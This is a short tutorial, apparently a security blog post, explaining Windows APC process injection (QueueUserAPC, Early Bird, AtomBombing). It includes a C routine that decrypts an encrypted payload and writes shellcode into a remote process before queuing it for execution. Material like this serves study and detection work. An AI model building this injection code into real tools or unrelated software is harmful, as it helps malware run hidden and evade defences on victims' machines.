# Asynchronous Code Injection

## Introduction

Welcome to my new article! Today, I’ll walk you through how you can inject code using an asynchronous technique.

### Process Injection: Asynchronous Procedure Call

**Reference:** [MITRE ATT&CK - Asynchronous Procedure Call](https://attack.mitre.org)

Adversaries may inject malicious code into processes via the Asynchronous Procedure Call (APC) queue. This technique helps evade process-based defenses and can even be used to escalate privileges.

APC injection typically involves adding malicious code to the APC queue of a thread within a target process. These queued APC functions are executed when the thread enters an alertable state.

To perform this, a handle to the target process or thread is obtained using native Windows API calls like `OpenThread`. The `QueueUserAPC` function is then used to schedule the execution of the malicious function.

#### Variants

- **Early Bird Injection**: A suspended process is created, and the shellcode is injected before the process's entry point is reached—bypassing potential anti-malware hooks.
- **AtomBombing**: Utilizes APCs to execute malicious code previously written to the global atom table.

## Injection Steps

1. Identify a suitable thread within the target process.
2. Copy or deliver the shellcode to the remote process.
3. Use `QueueUserAPC` to queue an APC object pointing to the shellcode.
4. Set the target thread to an alertable state.
5. The APC is executed when the thread becomes alertable.

![image](https://github.com/user-attachments/assets/2ffe589b-3284-4c40-a159-3c0365709ac1)

## Code Example

```c
int InjectAPC(int pid, HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
    HANDLE hThread = NULL;
    LPVOID pRemoteCode = NULL;
    CONTEXT ctx;

    // Locate a thread in the target process
    hThread = FindThread(pid);
    if (hThread == NULL) {
        printf("Error: Thread hijacking unsuccessful.\n");
        return -1;
    }

    // Decrypt and prepare payload
    AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key)); 

    // Allocate memory in the target process and write the payload
    pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

    // Queue the shellcode for execution via APC
    QueueUserAPC((PAPCFUNC)pRemoteCode, hThread, NULL);
    
    return 0;
}
```

### Explanation

- The first step is to find a suitable thread in the target process.
- The payload is decrypted using AES.
- Memory is allocated in the target process using `VirtualAllocEx`.
- The decrypted shellcode is written to the allocated memory with `WriteProcessMemory`.
- Finally, `QueueUserAPC` schedules the shellcode for execution when the thread enters an alertable state.

## Proof of Concept

Executing this method successfully runs the shellcode (e.g., a MessageBox) in the remote process.

![image](https://github.com/user-attachments/assets/00095590-5232-4c3c-bb64-5004f3467599)

## Conclusion

This guide demonstrates how to use asynchronous techniques for injecting code into a remote process using APCs. I hope you found this informative.

Thanks for reading!

**— Malforge Group**
